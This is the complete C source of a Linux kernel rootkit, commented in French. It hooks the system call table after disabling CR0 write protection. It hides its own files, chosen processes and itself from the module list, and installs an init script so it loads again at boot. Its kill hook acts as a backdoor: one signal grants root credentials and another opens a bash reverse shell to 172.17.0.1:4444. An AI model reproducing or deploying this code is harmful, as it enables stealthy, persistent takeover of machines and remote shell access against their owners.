#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/string.h>
#include <linux/list.h>

#define MAX__pid 100

/**
 * Convertit une chaîne de caractères en entier.
 * @param str Chaîne de caractères à convertir.
 * @return Entier résultant de la conversion ou 0 en cas d'erreur.
 */
int my_atoi(const char *str) {
    int res = 0;  // Initialize result

    // Iterate through each character of the string
    int i;
    for (i = 0; str[i] != '\0'; ++i) {
        // Check for non-numeric character
        if (str[i] < '0' || str[i] > '9') {
            //printk("Invalid input: non-numeric character encountered.\n");
            return 0;  // Return 0 for invalid input
        }

        res = res * 10 + str[i] - '0';  // Convert character digit to integer and add to result
    }

    return res;  // Return the result
};

typedef struct __pid {
    int data;
    struct __pid* next;
} __pid;

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents = NULL;
static t_syscall orig_getdents64 = NULL;
static t_syscall orig_read = NULL;
static t_syscall orig_kill = NULL;
static short hidden = 0;
static struct list_head *prev_module;
static char *lhost_ip = "172.17.0.1";
static char *lhost_port = "4444";

__pid* head = NULL;
__pid __pidPool[MAX__pid]; // Pool of __pids
int __pidCount = 0; // Counter for used __pids



/**
 * Obtient un nouveau pointeur __pid initialisé avec la valeur spécifiée.
 * @param value Valeur à assigner au nouveau pointeur __pid.
 * @return Pointeur __pid nouvellement alloué ou NULL si le pool est plein.
 */
__pid* getNew__pid(int value)
{
    if (__pidCount >= MAX__pid) {
        // No more __pids available
        return NULL;
    }
    __pid* new__pid = &__pidPool[__pidCount++];
    new__pid->data = value;
    new__pid->next = NULL;
    return new__pid;
}
/**
 * Ajoute un pointeur __pid à la liste chaînée.
 * @param head Pointeur vers la tête de la liste chaînée.
 * @param value Valeur à ajouter à la liste.
 */
void add__pid(__pid** head, int value)
{
    __pid* new__pid = getNew__pid(value);
    if (new__pid == NULL) {
        // print("Unable to add __pid. __pid pool is full.\n");
        return;
    }
    new__pid->next = *head;
    *head = new__pid;
}

/**
 * Supprime un pointeur __pid de la liste chaînée.
 * @param head Pointeur vers la tête de la liste chaînée.
 * @param value Valeur à supprimer de la liste.
 * @return Vrai si la valeur a été supprimée, sinon faux.
 */
bool remove__pid(__pid** head, int value)
{
    __pid *temp = *head, *prev = NULL;

    // If head __pid itself holds the value to be deleted
    if (temp != NULL && temp->data == value) {
        *head = temp->next;
        return true;
    }

    // Search for the value to be deleted
    while (temp != NULL && temp->data != value) {
        prev = temp;
        temp = temp->next;
    }

    // If value was not present in linked list
    if (temp == NULL) return false;

    // Unlink the __pid from linked list
    prev->next = temp->next;
    return true;
}

/**
 * Affiche les valeurs contenues dans la liste chaînée de pointeurs __pid.
 * @param __pid Pointeur vers le début de la liste chaînée.
 */
void printList(__pid* __pid)
{
    while (__pid != NULL) {
        printk(KERN_INFO" %d ", __pid->data);
        __pid = __pid->next;
    }
    printk(KERN_INFO "\n");
}

/**
 * Vérifie si une valeur est présente dans la liste chaînée de pointeurs __pid.
 * @param head Pointeur vers le début de la liste chaînée.
 * @param value Valeur à rechercher dans la liste.
 * @return 1 si la valeur est trouvée, 0 sinon.
 */
// Function to check if a value is in the list
int is_inList(__pid* head, int value)
{
    __pid* cur_pid = head;
    while (cur_pid != NULL) {
        if (cur_pid->data == value) {
            return 1; // Value found
        }
        cur_pid = cur_pid->next;
    }
    return 0; // Value not found
}


/**
 * Force la modification du registre CR0 pour autoriser l'écriture.
 */
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void)
{
  write_cr0_forced(read_cr0() | ~0x00010000);
}

static inline void unprotect_memory(void)
{
  write_cr0_forced(read_cr0() & ~0x00010000);
}

/**
 * Obtient un pointeur vers la table des appels système.
 * @return Pointeur vers la table des appels système.
 */
static unsigned long **get_syscall_table(void)
{
    unsigned long **syscall_table = NULL;
    static struct kprobe kp = 
    {
        .symbol_name = "kallsyms_lookup_name"
    };
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;

    int ret = register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    syscall_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
    return syscall_table;
}

/**
 * Intercepte et modifie les résultats de l'appel système getdents.
 * Imprimez les noms des fichiers et filtrez ceux contenant "vuln.ko".
 * @param pt_regs Structure contenant les registres du processeur.
 * @return Nombre de bytes écrits dans le buffer utilisateur.
 */
static asmlinkage long my_getdents(const struct pt_regs *pt_regs)
{

  //printk(KERN_INFO "GETDENTS CALLED\n");

	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;

	int ret = orig_getdents64(pt_regs), err;

	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct i__pid *d_i__pid;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err){
    goto out;   
  }

	while (off < ret) {
		dir = (void *)kdirent + off;
    //printk(KERN_INFO "my_atoi: %d\n", my_atoi(dir->d_name));
		if (strstr(dir->d_name, "vuln.ko") != NULL || strstr(dir->d_name, "file1") != NULL || is_inList(head, my_atoi(dir->d_name))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);

	if (err){
    goto out;
  }

  out:
    kfree(kdirent);
    return ret;
	
}

/**
 * Fonction personnalisée pour l'appel système read.
 * Actuellement, cette fonction redirige simplement vers l'appel système read original.
 * Des extensions futures pourraient inclure des fonctionnalités supplémentaires.
 * @param pt_regs Structure contenant les registres du processeur.
 * @return Le nombre de bytes lus, ou un code d'erreur en cas d'échec.
 */

static asmlinkage ssize_t my_read(const struct pt_regs *pt_regs)
{
  ssize_t ret = orig_read(pt_regs);
  char *ptr = pt_regs->si;
  return ret;
}

/**
 * Implémente une fonction de persistance pour le module kernel.
 * Exécute une commande pour afficher un message via 'wall' et imprime un message de journalisation.
 * Peut être étendue pour inclure des fonctionnalités supplémentaires de persistance.
 * @return 0 en cas de succès, autre valeur en cas d'échec.
 */

static int persistance(void)
{
    struct file *file;
    loff_t pos;

    // Specify the file path (change it to your desired path)
    const char *file_path = "/etc/init.d/file1";
    
    // Open the file in write mode, create if not exists
    file = filp_open(file_path, O_CREAT | O_WRONLY, 0777);
    if (IS_ERR(file)) {
        return -1;
    }
    // Change the file position to the end
    char *content = "#!/usr/bin/env sh\ninsmod /vuln.ko\n"; 
    // Write to the file
    kernel_write(file, content, strlen(content), 0);
    // Close the file
    filp_close(file, NULL);
    char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    char *argv[] = {
				"/sbin/rc-update",
        "add",
        "file1",
        "default",
				NULL
			};
    call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
    return 0;
}

/**
 * Cache le module actuel du noyau.
 * @param void
 */
void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/**
 * Affiche le module actuel du noyau.
 @param void 
 */
void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

static asmlinkage int exec_command(char *bash_command)
{
    char *argv[] = { "/bin/bash", "-c", bash_command, NULL };
    static char *env[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };

    return call_usermodehelper(argv[0], argv, env, UMH_WAIT_EXEC);
}

/**
 * Fonction personnalisée pour l'appel système kill.
 * Interprète des signaux spécifiques pour déclencher des actions cachées,
 * telles que l'élévation de privilège, la dissimulation du module et l'exécution de commandes.
 * @param pt_regs Structure contenant les registres du processeur.
 * @return 0 pour succès, un code d'erreur sinon, ou l'appel à la fonction kill originale.
 */

asmlinkage int hooked_kill(const struct pt_regs *pt_regs)
 {
    //printk(KERN_INFO "HOOKING KILL CALLED \n");
    pid_t pid = pt_regs->di; // Premier argument de syscall (__pid) dans le registre 'rdi' donc 'di'
    int sig = pt_regs->si;   // Deuxième argument (sig) dans le registre 'rsi' donc 'si'

    if (sig == 26 && pid == 2600) { // Condition personnalisée pour déclencher l'élévation
        struct cred *new_creds;
        new_creds = prepare_creds();
        if (!new_creds) {
            return -ENOMEM;
        }
        // Définir les UID et GID à 0 (root)
        new_creds->uid.val = new_creds->gid.val = 0;
        new_creds->euid.val = new_creds->egid.val = 0;
        new_creds->suid.val = new_creds->sgid.val = 0;
        new_creds->fsuid.val = new_creds->fsgid.val = 0;
        commit_creds(new_creds);
        return 0; // Retourner succès sans tuer le processus
    }
    else if ( (sig == 64) && (hidden == 0) )
    {
        hideme();
        hidden = 1;
        return 0;
    }
    else if ( (sig == 64) && (hidden == 1) )
    {
        showme();
        hidden = 0;
        return 0;
    }

    else if ( sig == 42 )
    {
      add__pid(&head, (int)pid);
      //printList(head);
      return 0;
    }

    else if( sig == 43)
    {
      remove__pid(&head, (int)pid);
      //printList(head);
      return 0;
    }


    else if (sig == 62 && pid == 2600) {
        char bash_command[100];
        snprintf(bash_command, sizeof(bash_command), "/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", lhost_ip, lhost_port);
        pr_info("Connecting shell on IP: %s and PORT: %s\n", lhost_ip, lhost_port);
        exec_command(bash_command);
        return 0;
    }
    return orig_kill(pt_regs); // Appel de la fonction kill originale
}

/**
 * Première fonction appeler pour charger le module
 * @param void
 */
static int __init m_init(void)
{
  //printk(KERN_INFO "ROOTKIT LOADED\n");
  persistance();

  unsigned long **__sys_call_table = get_syscall_table();
  if(__sys_call_table == NULL)
  {
    return 0;
  }
  orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
  orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
  orig_read = (t_syscall)__sys_call_table[__NR_read];
  orig_kill = (t_syscall)__sys_call_table[__NR_kill];

  unprotect_memory();

  __sys_call_table[__NR_getdents] = (unsigned long) my_getdents;
  __sys_call_table[__NR_getdents64] = (unsigned long) my_getdents;
  __sys_call_table[__NR_read] = (unsigned long)my_read;
  __sys_call_table[__NR_kill] = (unsigned long)hooked_kill;


  return 0;
}

/**
 * fonction appeler pour décharger le module
 * @param void
 */
static void __exit m_exit(void)
{
  //pr_info("module unloaded\n");
  unsigned long **__sys_call_table = get_syscall_table();
  unprotect_memory();
    __sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
    __sys_call_table[__NR_read] = (unsigned long)orig_read;
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;

    protect_memory();
}

module_init(m_init);
module_exit(m_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("GR9");
